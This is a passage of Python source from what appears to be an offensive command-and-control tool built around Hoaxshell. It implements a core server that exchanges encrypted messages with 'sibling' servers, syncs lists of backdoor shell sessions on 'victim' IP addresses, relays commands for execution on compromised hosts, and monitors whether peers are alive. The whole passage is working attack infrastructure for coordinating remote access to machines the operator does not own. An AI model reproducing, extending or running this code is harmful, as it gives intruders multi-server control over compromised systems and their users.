					elif decrypted_data[0] == 'command_output':
						
						print(f'\r{GREEN}{decrypted_data[1]}{END}')
						Core_server.send_msg(conn, self.response_ack(sibling_id))
						
						if Hoaxshell.active_shell:
							Hoaxshell.prompt_ready = True



					elif decrypted_data[0] == 'new_session':
						
						new_session_id = decrypted_data[1]['session_id']
						decrypted_data[1].pop('session_id', None)
						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
						print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
						del decrypted_data, new_session_id						
						Core_server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'shell_session_status_update':
						
						session_id = decrypted_data[1]['session_id']
						Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']		
						Core_server.send_msg(conn, self.response_ack(sibling_id))
						status = f'{GREEN}Active{END}' if decrypted_data[1]['Status'] == 'Active' else f'{ORANGE}Undefined{END}'
						print(f'\r[{INFO}] Backdoor session {ORANGE}{session_id}{END} status changed to {status}.')

						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
							Hoaxshell.deactivate_shell()

						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
						del session_id, status
						



					elif decrypted_data[0] == 'session_terminated':
						
						victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
						Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
						print(f'\r[{INFO}] Backdoor session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
						
						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
							Hoaxshell.deactivate_shell()
						
						del victim_ip	
						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()				
						Core_server.send_msg(conn, self.response_ack(sibling_id))



					elif decrypted_data[0] == 'server_shutdown':
						
						server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
						hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
						self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)
						
						# Remove sessions associated with sibling server
						active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
						active_sessions = active_sessions_clone.keys()
						lost_sessions = 0
						
						if active_sessions:
							
							for session_id in active_sessions:
								
								try:
									if Sessions_manager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
										del Sessions_manager.active_sessions[session_id]
										lost_sessions += 1
										
								except:
									continue
																
						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
						print(f'\r[{WARN}] {lost_sessions} x backdoor sessions lost.') if lost_sessions else chill()
						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
						del server_ip, hostname, active_sessions_clone, active_sessions
						Core_server.send_msg(conn, self.response_ack(sibling_id))
										
										

					elif decrypted_data[0] == 'are_you_alive':
						Core_server.send_msg(conn, self.response_ack(sibling_id))
						rst_prompt = False	
					
					else:
						pass
	
		
		except KeyboardInterrupt:
			pass
		
		
		except:
			print('failed to process a request')
			pass				
				
		conn.close()
		
		if rst_prompt:			
			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
			else Hoaxshell.set_shell_prompt_ready()
		
		del raw_data, str_data			
		Threading_params.thread_limiter.release()
		return



	@staticmethod
	def recv_msg(sock):
		
		raw_msglen = Core_server.recvall(sock, 4)
		
		if not raw_msglen:
			return None
			
		msglen = struct.unpack('>I', raw_msglen)[0]

		return Core_server.recvall(sock, msglen)
		
		
		
	@staticmethod
	def recvall(sock, n):

		data = bytearray()
		
		while len(data) < n:
			packet = sock.recv(n - len(data))
			
			if not packet:
				return None
				
			data.extend(packet)
			
		return data



	@staticmethod
	def send_msg(sock, msg):
		msg = struct.pack('>I', len(msg)) + msg
		sock.sendall(msg)


		
		
	def initiate(self):
		
		try:
			server_socket = socket.socket()
			server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server_socket.bind((Core_server_settings.bind_address, Core_server_settings.bind_port))
					
		except OSError:
			self.core_initialized = False
			exit_with_msg(f'Core server failed to start. Port {Core_server_settings.bind_port} seems to be already in use.\n')
		
		except:
			self.core_initialized = False
			exit_with_msg('Core server failed to start (Unknown error occurred).\n')
		
		self.core_initialized = True	
		print(f'\r[{INFO}] Core server listening on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')

		# Start listening for connections
		server_socket.listen()
		
		while self.listen:

			conn, address = server_socket.accept()
			Thread(target = self.sock_handler, args = (conn, address)).start()
			
		conn.close()



	def response_ack(self, sibling_id):
		
		response_ack = str(self.encapsulate_dict({0 : 0}, 'ACKNOWLEDGED'))
		response_ack_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response_ack, sibling_id[0:16].encode('utf-8'))
		return response_ack_encypted



	def decrypt_encapsulated_msg(self, sibling_id, raw_data):
		
		decrypted_data = decrypt_msg(sibling_id.encode('utf-8'), raw_data, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
		decapsulated = self.decapsulate_dict(decrypted_data) # returns [capsule, received_data]
		return decapsulated



	def stop_listener(self):
		self.listen = False
		


	def list_siblings(self):
		
		if self.sibling_servers.keys():

			print('\r')
			table = self.siblings_dict_to_list()
			print_table(table, ['Sibling ID', 'Server IP', 'Server Port', 'Hostname', 'Status'])			
			print('\r')
		
		else:
			print(f'Not connected with other servers.')
	   
	   

	@staticmethod
	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 30):
		
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
				client_socket.settimeout(timeout)
				client_socket.connect((str(server_ip), int(server_port)))
				msg = msg.encode('utf-8') if encode_msg else msg
				Core_server.send_msg(client_socket, msg)
				response_raw = Core_server.recv_msg(client_socket)
				client_socket.close()
				return response_raw
					
		except ConnectionRefusedError:
			return 'connection_refused'
		
		except ConnectionResetError:
			return 'connection_reset'
			
		except OSError:
			return 'no_route_to_host'
			
		except socket.timeout:
			return 'timed_out'
		
		except:
			return 'unknown_error'



	@staticmethod
	def encapsulate_dict(data, encapsulate_as):
		
		encapsulated = {}
		encapsulated[encapsulate_as] = data
		return encapsulated
		
		

	@staticmethod
	def decapsulate_dict(data, request = 'NoCapsule'):

		try:
			dict_data = literal_eval(data)
			capsule = list(dict_data.keys())[0]		
			received_data = dict_data[capsule]
			return [capsule, received_data]
			
		except:
			return 'failed_to_read'



	@staticmethod
	def announce_new_session(new_session_data_dict):
		
		siblings = clone_dict_keys(Core_server.sibling_servers)		
		
		if siblings:			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')
		
		del siblings



	@staticmethod
	def announce_shell_session_stat_update(new_session_data_dict):
		
		siblings = clone_dict_keys(Core_server.sibling_servers)	
		
		if siblings:			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'shell_session_status_update')
		
		del siblings
						


	@staticmethod
	def announce_session_termination(terminated_session_data_dict):
		
		siblings = clone_dict_keys(Core_server.sibling_servers)
		
		if siblings:
			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, terminated_session_data_dict, 'session_terminated')

		del siblings
		


	@staticmethod
	def announce_server_shutdown():
		
		siblings = Core_server.sibling_servers.keys()
		
		if len(siblings):
			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, {'sibling_id' : Core_server.SERVER_UNIQUE_ID}, 'server_shutdown')
				
				
				
	def update_siblings_data_table(self, siblings_data):
		
		current_siblings = self.sibling_servers.keys()
		additional_siblings = 0
		
		for sibling_id in siblings_data.keys():
			if (sibling_id not in current_siblings) and (sibling_id != self.SERVER_UNIQUE_ID):
				self.sibling_servers[sibling_id] = siblings_data[sibling_id]
				additional_siblings += 1
		
		if additional_siblings:
			print(f'\r[{INFO}] {additional_siblings} x additional sibling server connections established!')
			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()



	def update_shell_sessions(self, shells_data):

		current_shells = clone_dict_keys(Sessions_manager.active_sessions)
		additional_shells = 0
		
		if isinstance(shells_data, dict):
			for session_id in shells_data.keys():
				if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Hoaxshell.server_unique_id:
					shells_data[session_id]['alias'] = None
					shells_data[session_id]['aliased'] = False
					shells_data[session_id]['self_owned'] = False
					Sessions_manager.active_sessions[session_id] = shells_data[session_id]
					additional_shells += 1		
		
		if additional_shells:
			print(f'\r[{INFO}] {additional_shells} x additional shell sessions established!')		
			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()			



	def server_is_sibling(self, server_ip, server_port = False):
		
		sibling_id = None
		siblings = clone_dict_keys(self.sibling_servers)	
		
		for sibling in siblings:
			
			if server_port:
				if self.sibling_servers[sibling]['Server IP'] == server_ip and \
				self.sibling_servers[sibling]['Server Port'] == int(server_port):
					sibling_id = sibling
					break
					
			else:
				if self.sibling_servers[sibling]['Server IP'] == server_ip:
					sibling_id = sibling
					break				
		
		return sibling_id



	@staticmethod
	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 10):
		
		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
		server_unique_id = Core_server.return_server_uniq_id()
		encapsulated_data = str(Core_server.encapsulate_dict(data_dict, capsule))
		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, sibling_id[0:16].encode('utf-8'))
		
		# Prepare to send msg
		server_ip = Core_server.sibling_servers[sibling_id]['Server IP']
		server_port = Core_server.sibling_servers[sibling_id]['Server Port']
		
		encapsulated_response_data_encrypted = Core_server.send_receive_one(encapsulated_data_encrypted, server_ip, server_port, encode_msg = False, timeout = timeout)
		
		if encapsulated_response_data_encrypted not in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
			decapsulated_response_data = Core_server.decapsulate_dict(encapsulated_response_data_decrypted, capsule) # returns [capsule, received_data]
			return decapsulated_response_data
		
		else:
			return encapsulated_response_data_encrypted
		
		

	def synchronize_sibling_servers(self, initiator):
		
		print(f'\r[{INFO}] Synchronizing servers...')
		sibling_servers = clone_dict_keys(self.sibling_servers)	
		
		for sibling_id in sibling_servers:
			
			remote_siblings_data = Core_server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'synchronize_sibling_servers_table')
			
			if isinstance(remote_siblings_data[1], dict):
				self.update_siblings_data_table(remote_siblings_data[1])
			
			# Sync sibling servers shell sessions
			remote_shells = Core_server.send_receive_one_encrypted(sibling_id, Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
			self.update_shell_sessions(remote_shells[1])			

		if not self.ping_sibling_servers:
			siblings_status_monitor = Thread(target = self.ping_siblings, args = ())
			siblings_status_monitor.daemon = True
			siblings_status_monitor.start()

		print(f'\r[{INFO}] Synchronized!')
		
		if initiator:
			Main_prompt.set_main_prompt_ready()			
		else:
			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()



	def connect_with_sibling_server(self, server_ip, server_port):
								
		try:
			server_port = int(server_port)
			
		except ValueError:
			print('Port must be of type Int.')
			return
		
		authorized = True
		
		if not is_valid_ip(server_ip):
			print('\rProvided IP address is not valid.')
			authorized = False				
		
		if server_port < 0 or server_port > 65535:
			print('\rPort must be 0-65535.')
			authorized = False					
		
		# Check if attempt to connect to self
		if (server_port == Core_server_settings.bind_port) and (server_ip in ['127.0.0.1', 'localhost']):
			print('\rIf you really want to connect with yourself, try yoga.')
			authorized = False						
		
		# Check if server_ip already in siblings
		server_is_sibling = self.server_is_sibling(server_ip, server_port)
		
		if server_is_sibling:
			print('\rYou are already connected with this server.')
			authorized = False			
			
			
		# Init connect
		if authorized:
			
			print(f'[{INFO}] Sending request to connect...')
			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False, timeout = 11)
			
			if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
				return print(f'\r[{FAILED}] Request to connect failed ({response}).')
				
			elif response == self.CONNECT_ACK:
				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{Core_server_settings.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
				tmp = response.decode('utf-8', 'ignore').split(':')
				sibling_id = tmp[0]
				sibling_hostname = tmp[1]

				if is_valid_uuid(sibling_id):
					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : 'Active'}
						
				else:
					print(f'\r[{FAILED}] Request to connect failed.')
					return
						
				print(f'\r[{INFO}] Connection established!\r')
				
				self.synchronize_sibling_servers(initiator = True)
					
			elif response == self.CONNECT_DENY:	
				print(f'\r[{FAILED}] Request to connect denied.')

		

	@staticmethod	
	def proxy_cmd_for_exec_by_sibling(sibling_id, session_id, command):
		
		# Check again if server in siblings
		if sibling_id not in Core_server.sibling_servers.keys():
			print(f'\r[{FAILED}] Failed to proxy the command. Connection with the sibling server may be lost.')
			return
		
		# Send command to sibling
		cmd_exec_data = {'session_id' : session_id, 'command' : command}
		response = Core_server.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command', Core_server_settings.timeout_for_command_output)
		
		# Read response
		if response[0] == 'ACKNOWLEDGED':
			print(f'[{INFO}] Command delivered. Awaiting output...')
		
		

	def ping_siblings(self):
		
		Threading_params.thread_limiter.acquire()
		self.ping_sibling_servers = True
		
		while True:
			
			siblings = clone_dict_keys(self.sibling_servers)
			
			if not siblings:
				sleep(Core_server_settings.ping_siblings_sleep_time)
			
			else:
				
				for sibling_id in siblings:
					
					try:				
						response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive', 4)	

						if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
							self.remove_all_sessions(sibling_id)
							server_ip = self.sibling_servers[sibling_id]["Server IP"]
							del self.sibling_servers[sibling_id]
							print(f'\r[{WARN}] Connection with sibling server {ORANGE}{server_ip}{END} lost.')
							Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
												
					except:					
						continue
			
			sleep(Core_server_settings.ping_siblings_sleep_time)
			


	def remove_all_sessions(self, sibling_id):
		
		active_sessions = clone_dict_keys(Sessions_manager.active_sessions)
		
		for session_id in active_sessions:
			if Sessions_manager.active_sessions[session_id]['Owner'] == sibling_id:
				del Sessions_manager.active_sessions[session_id]



	def siblings_dict_to_list(self):
		
		siblings_list = []
		corrupted = 0
		siblings_clone = deepcopy(self.sibling_servers)
		
		for sibling_id in siblings_clone.keys():
			
			try:
				tmp = siblings_clone[sibling_id]
				tmp['Sibling ID'] = sibling_id
				siblings_list.append(tmp)
				
			except KeyError:
				corrupted += 1
			
		if corrupted:
			print(f'\r[{WARN}] {corrupted} x Corrupted sibling server data entries omitted.')
			print(f'[{WARN}] Possible reason: Sibling server disconnected inelegantly.\n')
		
		del siblings_clone, tmp
		return siblings_list
